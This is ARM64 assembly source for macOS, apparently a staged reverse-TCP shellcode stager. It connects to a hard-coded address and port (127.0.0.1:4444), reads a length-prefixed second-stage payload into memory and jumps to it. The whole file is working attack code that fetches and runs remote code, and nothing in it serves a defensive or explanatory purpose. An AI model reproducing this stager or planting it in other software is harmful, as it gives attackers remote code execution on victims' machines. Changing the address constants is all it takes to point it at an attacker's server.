.equ SYS_SOCKET, 0x61
.equ SYS_CONNECT, 0x62
.equ SYS_READ, 0x03
.equ SYS_MMAP, 0xc5
.equ SYS_EXIT, 0x01

.equ AF_INET, 0x2
.equ SOCK_STREAM, 0x1

.equ STDIN, 0x0
.equ STDOUT, 0x1
.equ STDERR, 0x2

.equ IP, 0x0100007f
.equ PORT, 0x5C11

start:
    /* sockfd = socket(AF_INET, SOCK_STREAM, 0) */
    mov    x0, AF_INET
    mov    x1, SOCK_STREAM
    mov    x2, 0
    mov    x16, SYS_SOCKET
    svc    0
    mov    x12, x0

    /* connect(sockfd, (struct sockaddr *)&server, sockaddr_len) */
    adr    x1, sockaddr
    mov    x2, 0x10
    mov    x16, SYS_CONNECT
    svc    0
    cbnz   w0, failed

    /* read(sockfd, buf='x1', nbytes=4) */
    mov    x0, x12
    sub    sp, sp, #16
    mov    x1, sp
    mov    x2, #4
    mov    x16, SYS_READ
    svc    0
    cmn    x0, #0x1
    beq    failed

    ldr    w2, [sp,#0]

    /* Page-align, assume <4GB */
    lsr    x2, x2, #12
    add    x2, x2, #1
    lsl    x2, x2, #12

    adr    x0, next_stage
    lsr    x0, x0, #12
    add    x0, x0, #1
    lsl    x0, x0, #12

    /* Grab the saved size, save the address */
    ldr    w4, [sp]

    /* Save the memory address */
    str    x0, [sp]

    /* Read in all of the data */
    mov    x3, x0

read_loop:
    /* read(sockfd, buf='x3', nbytes='x4') */
    mov    x0, x12
    mov    x1, x3
    mov    x2, x4
    mov    x16, SYS_READ
    svc    0
    cmn    x0, #0x1
    beq    failed
    add    x3, x3, x0
    subs   x4, x4, x0
    bne    read_loop

    /* Go to shellcode */
    ldr    x0, [sp]
    blr    x0

failed:
    mov    x0, 0
    mov    x16, SYS_EXIT
    svc    0

.balign 4
sockaddr:
.short AF_INET
.short PORT
.word  IP

next_stage:

